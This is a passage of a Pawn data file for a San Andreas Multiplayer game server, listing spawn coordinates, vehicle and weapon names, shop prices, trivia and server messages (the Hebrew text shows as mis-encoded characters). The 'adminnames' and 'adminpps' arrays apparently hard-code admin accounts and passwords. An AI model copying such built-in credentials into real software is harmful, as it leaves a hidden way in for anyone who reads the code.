	{2595.0657,2776.6729,23.8222,254.3630},
	{2601.3640,2777.8101,23.8222,253.4439},
	{2584.3940,2825.1748,27.8203,244.5475},
	{2631.8110,2834.2593,40.3281,213.2975},
	{2632.2852,2834.9390,122.9219,197.6725},
	{2646.1997,2817.7070,36.3222,182.0474},
	{2685.8875,2816.6575,36.3222,129.9525},
	{2691.1233,2787.7883,59.0212,208.0777},
	{2717.8071,2771.3464,74.8281,72.3429},
	{2695.2622,2699.5488,22.9472,66.3686},
	{2688.8206,2689.0039,28.1563,14.8979},
	{2655.0229,2650.6807,36.9154,341.8097},
	{2570.4668,2701.2876,22.9507,204.0154},
	{2498.9915,2704.6204,10.9844,168.9241},
	{2524.1584,2743.3735,10.9917,150.3771},
	{2498.3167,2782.3357,10.8203,251.7015},
	{2504.5142,2805.9763,14.8222,108.6137},
	{2522.2144,2814.7087,24.9536,265.9478},
	{2510.6292,2849.6384,14.8222,191.4991},
	{2618.2646,2720.8005,36.5386,346.6828},
	{2690.9980,2741.9060,19.0722,91.6099}
};
new Float:DMZ_RandomSpawns_WW[][4] =
{
	{-1309.9203,2491.5503,89.8672,5.6109},
	{-1321.0635,2503.2729,89.5703,71.0748},
	{-1316.5717,2503.0649,89.5703,266.8141},
	{-1321.1691,2512.3755,92.5406,359.0074},
	{-1324.8051,2528.4211,89.9844,176.6457},
	{-1334.9470,2525.6763,87.0469,338.3038},
	{-1308.1637,2544.1873,87.7422,353.3439},
	{-1304.1038,2552.3918,90.3281,257.2222}
};
new Float:DMZ_RandomSpawns_Jetp[][4] =
{
	{2275.1426,1111.2716,71.8153,271.2251},
	{2311.7361,1105.1235,79.5547,113.3270},
	{2306.8042,1155.9266,85.9375,145.8906},
	{2284.4561,1171.4448,85.9375,156.3352},
	{2247.1846,1148.5002,79.5547,195.5022},
	{2205.4426,1141.3469,85.9375,252.9472},
	{2171.9106,1083.6968,85.9312,355.4807},
	{2188.0693,1049.3900,79.5547,288.9809},
	{2192.7703,1045.5731,79.5547,286.8920},
	{2200.2788,1001.2169,85.9375,330.7591},
	{2229.2305,998.9128,85.9375,351.6481},
	{2257.6409,1016.8620,79.5547,27.8588},
	{2291.4160,1030.3260,85.9375,31.4259},
	{2318.0317,1083.4775,85.9312,100.7936}
};
new Float:DMZ_RandomSpawns_Matrix[][4] =
{
	{2241.5706,-1188.9576,1033.7969,274.3598},
	{2246.6978,-1194.4188,1029.7969,27.0415},
	{2243.9053,-1189.2682,1029.7969,91.9439},
	{2230.9893,-1167.4955,1029.7969,7.1466},
	{2196.4565,-1191.4388,1029.8043,317.5227},
	{2190.2034,-1180.8423,1033.7896,181.2005},
	{2186.4993,-1186.8073,1029.7969,303.9878},
	{2204.7417,-1172.9011,1029.7969,87.8706},
	{2193.4519,-1149.3362,1029.8043,359.0711},
	{2198.9976,-1145.9678,1029.7969,15.8646},
	{2234.9316,-1158.2003,1029.7969,257.1937}
};
new Float:DMZ_RandomSpawns_RCWar[][4] =
{
	{-1081.6062,1046.2057,1343.5325,222.5462},
	{-1037.1414,1063.9246,1344.3984,77.1815},
	{-1008.3450,1078.9255,1343.2269,83.4482},
	{-978.9857,1053.2493,1344.9834,80.6283},
	{-1058.4739,1061.0720,1343.9114,291.5036},
	{-1127.6195,1066.2969,1345.7368,268.1484}
};
new Float:DriftPositions_1[][4] =
{
	// x, y, z, a
	{2320.8093,1393.8324,42.5268,359.5473}, // spawn 1
	{2333.0850,1394.5033,42.5263,3.1412}, // spawn 2
	{2326.4226,1417.9100,42.3993,358.3418},
	{2323.2439,1452.4265,42.3897,8.6483},
	{2311.5264,1503.1876,42.3776,36.7752},
	{2279.7629,1501.3727,42.2636,166.3558},
	{2282.2590,1463.8866,39.8775,182.0490},
	{2284.3232,1404.6503,36.0876,181.9517},
	{2335.5752,1409.9380,35.5473,345.3621},
	{2302.5737,1507.0801,29.5926,86.7473},
	{2283.5613,1465.0750,27.1567,183.5859},
	{2313.9233,1398.7598,23.1971,266.4948},
	{2331.8303,1442.9036,20.6666,352.5644},
	{2320.7100,1504.8649,16.7444,16.9483},
	{2276.1724,1479.1611,15.2542,175.5226},
	{2281.8872,1408.5913,10.7469,174.2261},
	{2306.0747,1381.6716,10.2633,201.7342}
};
new Float:DriftPositions_2[][4] =
{
	// x, y, z, a
	{-2431.7996,-600.2036,132.0731,215.6459}, // spawn 1
	{-2427.6941,-597.3598,132.0723,214.2281}, // spawn 2
	{-2405.9785,-627.7079,131.9418,226.3866}, // drift1_cp
	{-2346.4607,-701.3117,111.8341,182.1702}, // drift1_cp
	{-2352.2820,-769.7437,95.7464,199.1620}, // drift1_cp
	{-2259.4526,-754.5983,75.2640,308.0660}, // drift1_cp
	{-2194.4961,-811.4877,59.6021,181.4264} // drift1_cp
};
new Float:DriftPositions_3[][4] =
{
	// x, y, z, a
	{-772.2188,-1724.5984,96.1940,349.9267}, // drift2spawn
	{-766.0464,-1726.2227,96.1950,345.6118}, // drift2spawn
	{-758.2865,-1594.5811,95.0332,6.3537}, // drift2_cp
	{-758.7239,-1527.1305,91.9235,358.0211}, // drift2_cp
	{-763.3603,-1369.5243,80.8407,359.9169}, // drift2_cp
	{-725.8790,-1286.4279,65.1257,196.5649}, // drift2_cp
	{-716.4683,-1504.8101,57.3239,178.5891}, // drift2_cp
	{-718.7143,-1678.3099,49.9656,179.8778}, // drift2_cp
	{-677.0948,-1675.7222,32.1434,346.2139}, // drift2_cp
	{-656.3034,-1478.3372,20.0662,0.0835} // drift2_cp
};
new SAmmunation[][AmmunationEnum] =
{
	// name, id, cost, ammo
	{"Pistol",22,100,16,3},
	{"DesertEagle",24,250,15,3},
	{"CombatShotgun",27,300,15,3},
	{"SawnoffShotgun",26,500,8,3},
	{"MicroUzi",28,400,16,3},
	{"Tec9",32,300,16,3},
	{"M4",31,900,30,3},
	{"SniperRifle",34,1200,8,3},
	{"Grenade",16,2000,2,3},
	{"Molotov",18,2000,2,3},
	{"RocketLauncher",35,5000,2,3},
	{"Flowers",14,1000,0,3}
};
new Float:GambleAreas[][4] =
{
	{1928.1771,987.5739,1970.5675,1042.8369},
	{2171.3618,1584.2649,2279.4915,1628.6199},
	{1117.5068,-11.2747,1142.4843,12.5986}
};
new VehicleNames[212][32] =
{
   "Landstalker",
   "Bravura",
   "Buffalo",
   "Linerunner",
   "Pereniel",
   "Sentinel",
   "Dumper",
   "Firetruck",
   "Trashmaster",
   "Stretch",
   "Manana",
   "Infernus",
   "Voodoo",
   "Pony",
   "Mule",
   "Cheetah",
   "Ambulance",
   "Leviathan",
   "Moonbeam",
   "Esperanto",
   "Taxi",
   "Washington",
   "Bobcat",
   "Mr Whoopee",
   "BF Injection",
   "Hunter",
   "Premier",
   "Enforcer",
   "Securicar",
   "Banshee",
   "Predator",
   "Bus",
   "Rhino",
   "Barracks",
   "Hotknife",
   "Trailer",
   "Previon",
   "Coach",
   "Cabbie",
   "Stallion",
   "Rumpo",
   "RC Bandit",
   "Romero",
   "Packer",
   "Monster Truck A",
   "Admiral",
   "Squalo",
   "Seasparrow",
   "Pizzaboy",
   "Tram",
   "Trailer",
   "Turismo",
   "Speeder",
   "Reefer",
   "Tropic",
   "Flatbed",
   "Yankee",
   "Caddy",
   "Solair",
   "Berkley's RC Van",
   "Skimmer",
   "PCJ-600",
   "Faggio",
   "Freeway",
   "RC Baron",
   "RC Raider",
   "Glendale",
   "Oceanic",
   "Sanchez",
   "Sparrow",
   "Patriot",
   "Quad",
   "Coastguard",
   "Dinghy",
   "Hermes",
   "Sabre",
   "Rustler",
   "ZR-350",
   "Walton",
   "Regina",
   "Comet",
   "BMX",
   "Burrito",
   "Camper",
   "Marquis",
   "Baggage",
   "Dozer",
   "Maverick",
   "News Chopper",
   "Rancher",
   "FBI Rancher",
   "Virgo",
   "Greenwood",
   "Jetmax",
   "Hotring",
   "Sandking",
   "Blista Compact",
   "Police Maverick",
   "Boxville",
   "Benson",
   "Mesa",
   "RC Goblin",
   "Hotring Racer 1",
   "Hotring Racer 2",
   "Bloodring Banger",
   "Rancher",
   "Super GT",
   "Elegant",
   "Journey",
   "Bike",
   "Mountain Bike",
   "Beagle",
   "Cropdust",
   "Stunt",
   "Tanker",
   "RoadTrain",
   "Nebula",
   "Majestic",
   "Buccaneer",
   "Shamal",
   "Hydra",
   "FCR-900",
   "NRG-500",
   "HPV1000",
   "Cement Truck",
   "Tow Truck",
   "Fortune",
   "Cadrona",
   "FBI Truck",
   "Willard",
   "Forklift",
   "Tractor",
   "Combine",
   "Feltzer",
   "Remington",
   "Slamvan",
   "Blade",
   "Freight",
   "Streak",
   "Vortex",
   "Vincent",
   "Bullet",
   "Clover",
   "Sadler",
   "Firetruck",
   "Hustler",
   "Intruder",
   "Primo",
   "Cargobob",
   "Tampa",
   "Sunrise",
   "Merit",
   "Utility",
   "Nevada",
   "Yosemite",
   "Windsor",
   "Monster Truck B",
   "Monster Truck C",
   "Uranus",
   "Jester",
   "Sultan",
   "Stratum",
   "Elegy",
   "Raindance",
   "RC Tiger",
   "Flash",
   "Tahoma",
   "Savanna",
   "Bandito",
   "Freight",
   "Trailer",
   "Kart",
   "Mower",
   "Duneride",
   "Sweeper",
   "Broadway",
   "Tornado",
   "AT-400",
   "DFT-30",
   "Huntley",
   "Stafford",
   "BF-400",
   "Newsvan",
   "Tug",
   "Trailer",
   "Emperor",
   "Wayfarer",
   "Euros",
   "Hotdog",
   "Club",
   "Trailer",
   "Trailer",
   "Andromada",
   "Dodo",
   "RC Cam",
   "Launch",
   "Police Car (LSPD)",
   "Police Car (SFPD)",
   "Police Car (LVPD)",
   "Police Ranger",
   "Picador",
   "S.W.A.T. Van",
   "Alpha",
   "Phoenix",
   "Glendale",
   "Sadler",
   "Luggage Trailer A",
   "Luggage Trailer B",
   "Stair Trailer",
   "Boxville",
   "Farm Plow",
   "Utility Trailer"
};
new Float:KartPositions[][4] =
{
	// x, y, z, a
	{1493.5011,-1150.6019,135.1128,271.0335},
	{1549.7472,-1150.5513,135.1128,89.1923},
	{1493.5011,-1145.6019,135.1128,271.0335},
	{1549.7472,-1145.5513,135.1128,89.1923},
	{1493.5011,-1140.6019,135.1128,271.0335},
	{1549.7472,-1140.5513,135.1128,89.1923},
	{1493.5011,-1135.6019,135.1128,271.0335},
	{1549.7472,-1135.5513,135.1128,89.1923},
	{1493.5011,-1130.6019,135.1128,271.0335},
	{1549.7472,-1130.5513,135.1128,89.1923},
	{1493.5011,-1125.6019,135.1128,271.0335},
	{1549.7472,-1125.5513,135.1128,89.1923},
	{1493.5011,-1120.6019,135.1128,271.0335},
	{1549.7472,-1120.5513,135.1128,89.1923},
	{1493.5011,-1115.6019,135.1128,271.0335},
	{1549.7472,-1115.5513,135.1128,89.1923}
};
new Float:MonsterPositions[][4] =
{
	// x, y, z, a
	{-1367.1875,1020.0675,1025.4971,172.0661},
	{-1352.6119,1014.5676,1025.3285,133.4695},
	{-1339.2988,994.5236,1024.9327,84.7540},
	{-1355.8500,976.0822,1024.6056,41.9719},
	{-1381.9631,970.6732,1024.6658,345.1539},
	{-1410.3369,969.2608,1024.8108,338.7082},
	{-1437.0913,970.9547,1025.0037,329.5709},
	{-1456.8361,983.1830,1025.2461,303.3096},
	{-1459.5251,1005.5297,1025.6537,244.7194},
	{-1443.5648,1020.0569,1026.0367,193.9913},
	{-1413.0665,1020.8574,1025.5538,187.4881},
	{-1394.1953,1020.7808,1025.5369,187.2464},
	{-1359.3929,1020.3069,1025.7037,157.5711},
	{-1334.4923,1008.2554,1025.7871,134.6035},
	{-1340.8550,982.9427,1024.9844,60.7107},
	{-1372.8763,972.2613,1024.5333,5.2141},
	{-1402.6781,969.5472,1024.7783,6.4428},
	{-1431.0925,966.5847,1025.2233,330.6417}
};
new ActivitiesGameTextTimes[] =
{
	50,
	40,
	30,
	20,
	15,
	10,
	3,
	2,
	1
};
new Float:VIPCamera[][6] =
{
	{212.171386,1896.663696,16.199859,212.597961,1891.681884,16.199859},
	{4.929317,2068.139404,19.447860,-0.025807,2067.470947,19.447860},
	{-0.942762,2057.378173,29.808864,3.534595,2055.152587,29.808864},
	{281.982238,1915.403320,31.640625,278.965911,1919.390991,31.640625},
	{256.034210,1965.325683,34.633163,254.029052,1960.745361,34.633163}
};
new WeaponNames[48][32] =
{
	"Unarmed (Fist)", // 0
	"Brass Knuckles", // 1
	"Golf Club", // 2
	"Night Stick", // 3
	"Knife", // 4
	"Baseball Bat", // 5
	"Shovel", // 6
	"Pool Cue", // 7
	"Katana", // 8
	"Chainsaw", // 9
	"Purple Dildo", // 10
	"Big White Vibrator", // 11
	"Medium White Vibrator", // 12
	"Small White Vibrator", // 13
	"Flowers", // 14
	"Cane", // 15
	"Grenade", // 16
	"Teargas", // 17
	"Molotov", // 18
	" ", // 19
	" ", // 20
	" ", // 21
	"Colt 45", // 22
	"Colt 45 (Silenced)", // 23
	"Desert Eagle", // 24
	"Normal Shotgun", // 25
	"Sawnoff Shotgun", // 26
	"Combat Shotgun", // 27
	"Micro Uzi (Mac 10)", // 28
	"MP5", // 29
	"AK47", // 30
	"M4", // 31
	"Tec9", // 32
	"Country Rifle", // 33
	"Sniper Rifle", // 34
	"Rocket Launcher", // 35
	"Heat-Seeking Rocket Launcher", // 36
	"Flamethrower", // 37
	"Minigun", // 38
	"Satchel Charge", // 39
	"Detonator", // 40
	"Spray Can", // 41
	"Fire Extinguisher", // 42
	"Camera", // 43
	"Night Vision Goggles", // 44
	"Infrared Vision Goggles", // 45
	"Parachute", // 46
	"Fake Pistol" // 47
};
new Float:MoneyAreas[][4] =
{
	// minx, miny, maxx, maxy
	{1995.5,1518.0,2006.0,1569.0},					// LV Pirate Ship
	{807.0149,-1130.1915,870.1545,-1072.0072},		// LS Cemetery
	{870.1545,-1130.1936,941.2277,-1055.9233}		// LS Cemetery #2
};
/*new Float:AntiKillAreas[][4] =
{
	// minx, miny, maxx, maxy
	{1851.135,-1464.736,1984.234,-1346.304},		// LS Ramp
	{2220.318,1380.421,2341.368,1539.011}			// LV Drift
};*/
new SRacePositions[][SRaceEnum] =
{
	// type, x, y, z, a
	// type: 0=spawn 1=foot 2=swim/jetpack)
	{0,2181.4829,-117.3142,4.1922,132.1281}, // spawn
	{0,2177.7495,-113.5779,4.1130,133.7673}, // spawn
	{0,2173.2485,-109.4830,3.9845,133.7673}, // spawn
	{0,2164.8171,-96.1935,3.7130,133.7673}, // spawn
	{0,2160.1191,-88.7104,3.5032,133.7673}, // spawn
	{0,2157.8220,-85.3038,3.3364,117.1605}, // spawn
	{0,2155.1416,-80.2608,3.3173,117.1605}, // spawn
	{0,2152.0090,-73.9758,3.7826,117.1605}, // spawn
	{0,2148.5964,-68.3915,3.8491,117.1605}, // spawn
	{0,2144.0935,-62.6281,4.0919,117.1605}, // spawn
	{0,2142.7522,-54.1215,4.3960,117.1605}, // spawn
	{0,2138.6914,-43.2350,3.9959,117.1605}, // spawn
	{0,2135.0991,-35.8521,3.5607,117.1605}, // spawn
	{0,2133.8613,-24.6281,3.7617,117.1605}, // spawn
	{1,2136.2141,-79.9504,2.9875,130.5614}, // foot
	{1,2119.1577,-92.7274,2.3203,130.5614}, // foot
	{1,2101.9976,-103.9981,2.3129,130.5614}, // foot
	{2,2083.7493,-116.8878,-0.5578,125.2347}, // swim
	{2,2063.7996,-135.1216,-0.5441,140.9015}, // swim
	{2,2050.0889,-151.9941,-0.5234,140.9015}, // swim
	{2,2033.1833,-172.8005,-0.2890,140.9015}, // swim
	{2,2016.6321,-193.1681,-0.2402,140.9015}, // swim
	{2,1996.0552,-224.0949,-0.5123,148.1082}, // swim
	{2,1980.9476,-248.3742,-0.3689,148.1082}, // swim
	{1,1970.0977,-267.9355,3.0157,148.1082}, // foot
	{1,1949.2217,-308.1130,10.5480,157.1950}, // foot
	{1,1937.3013,-361.7955,20.4411,154.6883}, // foot
	{1,1919.3907,-417.8201,21.5706,172.3138}, // foot
	{1,1906.4409,-477.9243,18.6378,173.4885}, // foot
	{1,1907.2905,-525.4886,19.5700,202.9421}, // foot
	{1,1925.7235,-557.4222,22.1321,220.5676}, // foot
	{2,1930.7930,-594.2236,44.9534,165.6551}, // jetpack
	{2,1922.1388,-649.0884,94.1629,162.5217}, // jetpack
	{2,1851.2841,-775.3363,119.6738,150.3016}, // jetpack
	{2,1799.0835,-870.8008,139.2892,150.3016}, // jetpack
	{2,1733.3008,-987.8911,115.3672,142.4682}, // jetpack
	{2,1679.6310,-1100.7605,121.9021,156.5683}, // jetpack
	{2,1631.0925,-1212.5453,100.3812,156.5683}, // jetpack
	{2,1593.6234,-1288.6611,42.8325,156.5683}, // jetpack
	{1,1577.8147,-1323.7844,16.4828,156.5683}, // foot
	{1,1540.8833,-1361.0149,329.4602,1.6392} // foot
};
new adminnames[][MAX_PLAYER_NAME] =
{
	"[gmR]Amit",
	"(gmR)Amit",
	"(gmR)Amit[L]",
	"(gmR)Amit(L)",
	"(GMW)Amit[L]",
	"(GMW)Amit(L)",
	"(GMW)Amit",
	"Amitd_B",
	"TheAmaitB_",
	"TheAmfit_B_",
	"TheAmnitBE",
	"The_aAmitB",
	"_TheAmit_B",
	"VAdM3_",
	"TesTesTerT3",
	"HeSoYaMye2",
	"KjKszpJa1",
	"UZUmYMw4",
	"ghJSht5",
	"ajio0Th6",
	"ah0ti09087",
	"Terahgsar8",
	"sethsrjBbn9",
	"shdiohy5387",
	"qscefbyMj",
	"y35t98qj",
	"MmeSgaS",
	"MsupSerS",
	"MsecuSrityS",
	"vl04ck94kc",
	"[sAMp)BOY",
	"kiIler_056e"
};
new adminpps[][64] =
{
	"123456798012345679801234564798012345679801234567980",
	"AMwT_bI",
	"qazwtsxedcrfvtgbyhnujmikOlp",
	"oj=-7p=o5a[p=-p-=v35qoq=064",
	"u93rh29r98324r9-i-io",
	"89w46h064hr.65geyg4g457",
	".320-8dfkd;al,",
	"ik3mgi0j40krf4k0f,94",
	"\"\"w04k09fr4f-kl-93i993999043094039",
	"i39ekap",
	"pXh",
	"o40l-f4=fl40-kf-04kf-l"
};
new triviaQuestions[][TriviaEnum] =
{
	{" ?ëîä òøéí éù áîùç÷","3","5","1"},
	{" ?áàéæä ùéâåø îäáàéí àñåø ìäøåâ","LC","LV","LS"},
	{" ?áàéæä ùéâåø îäáàéí àñåø ìäøåâ","Ramp","CT","War"},
	{" ?îäé äô÷åãä ìîéìåé çééí ìùç÷ï àçø","/hh","/hm","/heal"},
	{" ?ëîä çééí éù ìøëá ùìà ðôâò, áäúçìä","1000","100","200"},
	{" ?àéæä úå ðåöø ëàùø îðñéí ìä÷ìéã %% áö'àè","#","%%","ääåãòä ìà ðùìçú"},
	{" ?îäé äô÷åãä ìîéìåé çééí ìùç÷ï àçø","/hh","/hm","/heal"},
	{" ?SF äéëï ðîöà áîöéàåú äâùø ùðîöà ìéã äòéø","ñàï ôøðñéñ÷å","ñàï ôééøå","ìåñ àðâ'ìñ"},
	{" ?àéæä ùéâåø îäáàéí äéðå ùéâåø ôòìåìéí","/ramp","/challenge","/lv"},
	{" ?áàéæå ô÷åãä îùúîùéí ëùøåàéí ö'éèø","/report","/a","/admins"},
	{" ?àéê ùåìçéí äåãòä ôøèéú","/pm","/p","/msg"},
	{" ?àéê îàùøéí äæîðä ìãøéôè","/drift accept","/drift join","/driftjoin"},
	{" ?àéê îáèìéí äæîðä ì÷ìàï","/clan cancel","/clan unaccept","/clan deny"},
	{" ?ìîä îùîù áåè äùøú","øåáåè ùúåëðú ìòæåø ìùç÷ðéí åôòéì ø÷ áö'àè","ùç÷ï òí ëáåã ùäåøâ ëîå ëåìí","ùç÷ï áåè ùìà éåãò ìùç÷"},
	{" ?îä àôùø ìøàåú áòåìí äøåçåú","ùç÷ðéí ùäâéòå ìòåìí äøåçåú åàú òöîê","ùç÷ðéí ùäâéòå ìòåìí äøåçåú, øëáéí åàú òöîê","ø÷ àú òöîê"},
	{" ?îäé âøñú äîåã äðåëçéú",version,"3.0.0","0.3.0"},
	{" ?WWE îäé äô÷åãä ìöôééä á","/wwe viewer","/wwe join","/wwe view"},
	{" ?àéê àôùø ìáãå÷ àí éù ëòú îéøåõ","/racing state","/racing have","/racing join"},
	{" ?àéê àôùø ìáãå÷ àí éù ëòú îéøåõ îéåçã","/srace state","/srace have","/srace join"},
	{" ?àéê àôùø ìáãå÷ àí éù ëòú îìçîú ùøú","/swar state","/swar have","/swar join"},
	{" ?Monster àéê àôùø ìáãå÷ àí éù ëòú úçøåú","/monster state","/monster have","/monster join"},
	{" ?Kart àéê àôùø ìáãå÷ àí éù ëòú","/kart state","/kart have","/kart join"},
	{" ?WWE àéê àôùø ìáãå÷ àí éù ëòú","/wwe state","/wwe have","/wwe join"},
	{" ?Kickstar àéê àôùø ìáãå÷ àí éù ëòú","/kickstar state","/kickstar have","/kickstar join"}
};
new luciferWeapons[] = {1,9,24,26,28,31,34,38,16,42,14,46};
new SecondAutoMessage[][M_S] =
{
	" /lc !àí ìà, àúí îåæîðéí ìùí îîù òëùéå ?Liberty City áé÷øúí ëáø áòéø",
	" /race ?îúçù÷ ìëí ìòùåú îéøåõ",
	" /drifts ?áà ìëí òì ãøéôè",
	" !/ships áåàå ëåìðå òëùéå, ìùéè âãåì áùéâåø",
	" /sandkings .âí àúí îåæîðéí ìéöåø èéåì â'éôéí",
	" /ct !äø ö'éìéàã ÷åøà ìëí. ëãàé ìëí ìáåà, äåà áâåáä äàååøñè",
	" /jump ?øåöéí ì÷ôåõ âáåä",
	" /bumper !îëåðéåú îúðâùåú ìà ø÷ áìåðä ôàø÷",
	" /tsf !úîéã çìîúí ìñåò áøëáú?! òëùéå àúí éëåìéí",
	" /tower .îâãì òæøéàìé ðîöà âí áùøú ùìðå",
	" /sfb ...øåöéí ìéôåì îâåáä øá? ëîåáï ùìà. àáì àí áëì æàú úøöå",
	" /diving !áåàå ì÷ôåõ îäø ùàéðëí îëéøéí",
	" /war îùòîí? øåöéí ìäìçí? ìòùåú ÷øáåú? ìøàåú ãí?! èåá, ìà ðâæéí. àáì àúí îåæîðéí ì",
	" /quarry .àí àúí àåäáéí ìçôåø ìàðùéí, àúí îåæîðéí ì÷çú èø÷èåø îîù òëùéå åìùôø àú éëåìú äçôéøä ùìëí",
	" /stunt ?îçôùéí ñèàðèéí? àúâøéí? î÷åîåú ìäðåú áäí",
	" /challenge .çåùáéí ùàúí îñôé÷ îéåîðéí áîùç÷ òì îðú ìòáåø àúâø âãåì? ðñå òëùéå",
	" /bigrampa !áåàå ìøàåú àú äøàîôä äëé âãåìä ùúøàå àéé ôòí",
	" /maze ?àåäáéí îáåëéí",
	" /slide .àúí îåæîðéí ìîâìùä àøåëä åëééôéú. îåîìõ àåôðåò",
	" .åäåà áçåõ /outcar ?îéùäå ðëðñ ìøëá ùìëí ììà øùåúëí",
	" /setfire !áåàå úøàå ìëåìí àéê àúí éåø÷éí àù îäôä",
	" /invisible ?øåöéí ùìà éøàå àåúëí",
	" /jetp .áåàå åúøàå ìðå ùàúí éëåìéí ìðåò ìà ø÷ áéáùä åáîéí",
	" /fireplace !?éëåìéí ìâòú áàù áìé ìäùøó",
	" /gambling ?øåöéí ìäøååéç éí ùì ëñó",
	" /friends ?øåöéí ùëåìí ééãòå îé äçáøéí ùìëí .SI_Bot éù ìé çáø, ÷åøàéí ìå",
	" /setting :ìà ðåç ìëí ìøàåú ùç÷ðéí îúçáøéí? øåöéí ìîçå÷ àú äàééãé îäö'àè? òøëå òëùéå àú äâãøåúéëí",
	" /editprofile ?øåöéí ìäùàø á÷ùø òí ëì äùç÷ðéí áùøú",
	" /diary !ðøùîúé ìùøú á 24.7.09. åàúí? øùîå äëì áéåîï ùìëí",
	" /clans :øåöéí ìòáåø èñè ì÷ìàï? áã÷å òëùéå àéæä ÷ìàðéí ôúåçéí",
	" /workhelp :áåàå úòáãå áàçú äòáåãåú ùàðå îöéòéí åú÷áìå òì ëê ëñó",
	" /pethelp ?ëáø ÷ðéúí çéä îùìëí",
	" /drifthelp !áåàå ìäúçøåú áãøéôèéí òí çáøéëí",
	" /pbattlehelp !îôøéòéí ìëí ìòùåú ÷øáåú 1 òì 1 áù÷è? àéï áòéä",
	" /sammuhelp ?ëáø îöàúí àú çðåéåú äðù÷ äñåãéåú",
	" /aahelp !áåàå åúùîéãå î÷åîåú áòæøú äú÷ôåú àåéøéåú îâðéáåú",
	" /editprofile name ?øåöéí ùâí ìëí äáåè éé÷øà áùîëí äôøèé",
	" /editprofile skin ?øåöéí ùäãîåú ùìëí úùàø ìúîéã",
	" /phonehelp .âí ìëí éù ôìàôåï ñìåìøé",
	" /contact ?îöàúí áàâ? øåöéí ìäöéò øòéåï ìîåã? ìäúìåðï òì ùç÷ï àå îðäì",
	" /superbonuses !?ëáø ÷ðéúí ñåôø áåðåñ",
	" /househelp !áåàå å÷ðå àú äáéú äàéùé ùìëí",
	" /csrandom ?îñê áçéøú äãîåéåú ùìëí îùòîí",
	" .òì îðú ìøàåú àú äîùç÷ èåá éåúø /fpslimit 100 àðå îîìéöéí îàåã ìäùúîù áô÷åãä",
	" !PageUp + PageDown äéãòú? úåëì ìáçåø ìøàåú çì÷éí îñåééîéí ùì äö'àè ùòìå ìîòìä áàîöòåú äî÷ùéí",
	" .ìéöéàä îäéøä îäîùç÷. ðà ìà ìä÷ùéá ìèîáìéí ùëåúáéí áö'àè àú ô÷åãåú àìå, ëãé ìà ìöàú ñúí /quit | /q äùúîù áô÷åãä",
	" /vinfo :äéãòú? âí ìøëá éù ô÷åãä ãåîä ìñèàèñ",
	" /crane ?øàéúí ëáø àú îòøëú äîðåó",
	" /colorhelp ?ìà îøåöéí îäöáò ùìëí",
	" /npclist - áã÷å ëîä áåèéí ðîöàéí ëøâò áùøú",
	" /stl !ðñå àú äùéâåøéí äîéåçãéí",
	" /barhelp ?øàéúí ëáø àú îòøëú äáø",
	" /npcrace :àúâøå àú òöîëí áîéøåõ òí áåèéí",
	" The Ultimate Power... /upower"
};
new SuperBonuses[][SBEnum] =
{
	{"None",0},
	{"25%% ñéëåéé æëééä á 2 äøéâåú òì ëì äøéâä, ìîùê ã÷ä",1000000},
	{"50%% ñéëåéé æëééä á 2 äøéâåú òì ëì äøéâä, ìîùê ã÷ä",2500000},
	{"100%% ñéëåéé æëééä á 2 äøéâåú òì ëì äøéâä, ìîùê ã÷ä",5000000},
	{"50%% ñéëåéé æëééä á 3 äøéâåú òì ëì äøéâä, ìîùê ã÷ä",2500000},
	{"100%% ñéëåéé æëééä á 3 äøéâåú òì ëì äøéâä, ìîùê ã÷ä åçöé",6000000},
	{"äøéâú ùç÷ï áàéæåø ãé-àí úòìä úîéã äøéâä ìîùê ã÷ä",7000000},
	{"ëåç îùéëä îåðîê ìîùê ã÷ä",500000},
	{"÷áìú äøéâä àçú",500000}
};
new Float:Kickstar[][4] =
{
	{-263.9980,1869.5922,41.8553,234.3040},
	{-254.0481,1875.9487,41.8552,332.8661},
	{-255.7169,1888.3082,41.8554,27.5878},
	{-249.6697,1897.5095,41.8552,293.1623},
	{-255.7095,1905.7705,41.8579,67.3874},
	{-264.2575,1905.4088,41.8593,103.2899},
	{-274.4509,1903.0027,41.8539,103.2977},
	{-286.6439,1900.1206,41.8553,103.2990},
	{-298.2935,1898.0782,41.8541,97.7317},
	{-316.7564,1894.9341,41.8586,95.9178},
	{-332.0386,1895.6207,41.8566,80.7565},
	{-346.0659,1893.4474,41.8579,114.5646},
	{-356.9742,1881.4010,41.8586,150.4576},
	{-359.0273,1867.4510,41.8564,186.4389},
	{-359.1079,1848.8007,41.8539,176.9764},
	{-355.0191,1825.1182,41.8564,202.0972},
	{-344.6560,1814.0854,41.8565,239.2873},
	{-329.4102,1812.5045,41.8553,274.9436},
	{-319.6698,1806.9648,41.9828,185.6094},
	{-310.2496,1805.3248,41.8615,287.8698},
	{-306.3340,1810.1714,41.8571,346.8863},
	{-302.7962,1819.5121,41.8560,335.0787},
	{-295.6102,1826.5406,41.8638,296.3629},
	{-291.7833,1832.8359,41.8562,349.9625},
	{-287.0417,1844.0957,41.8569,326.5869},
	{-278.4858,1849.0292,41.8584,270.0122},
	{-270.6162,1855.0671,41.8607,308.0939},
	{-262.5513,1861.3905,41.8543,308.0921},
	{-249.5746,1871.5627,41.8553,308.0920},
	{-244.0625,1880.8474,41.8553,333.7957},
	{-252.4603,1886.3619,41.8612,89.5541},
	{-259.5482,1878.4187,41.8568,121.1158},
	{-266.5324,1871.8059,41.8542,134.8543},
	{-275.8016,1865.1960,41.8578,121.6345},
	{-290.7639,1852.7031,41.8589,134.2072},
	{-301.6764,1840.4355,41.8552,140.5634},
	{-319.8827,1829.8859,41.8620,106.3482},
	{-335.7030,1828.0717,41.8578,83.6898},
	{-349.4161,1835.3694,41.8591,43.3229},
	{-350.4274,1851.3483,41.8582,324.9135},
	{-342.4449,1861.4550,41.8555,320.4637},
	{-338.1963,1877.1653,41.8622,12.4179},
	{-330.4361,1884.8511,41.8595,272.4261},
	{-321.7684,1883.0719,41.8561,248.6213},
	{-312.9702,1881.6991,41.8566,273.0733},
	{-301.8770,1884.3877,41.8542,286.9998},
	{-291.1172,1887.6769,41.8593,287.0011},
	{-277.0832,1887.6788,41.8571,256.7587},
	{-265.0674,1880.3951,41.8585,203.0435},
	{-269.3690,1872.9761,41.8596,103.0033},
	{-278.6534,1873.7991,41.8585,79.6902},
	{-289.9454,1869.9166,41.8581,125.4377},
	{-310.6656,1843.1034,41.8553,146.1161},
	{-313.7706,1824.3141,41.8579,197.0908},
	{-311.7670,1845.5769,41.8553,19.8873},
	{-314.6920,1853.6627,41.8583,19.8873},
	{-316.2576,1866.4564,41.8579,1.2996},
	{-320.9839,1882.6409,41.8553,26.5881},
	{-338.4432,1883.6722,41.8568,114.4696},
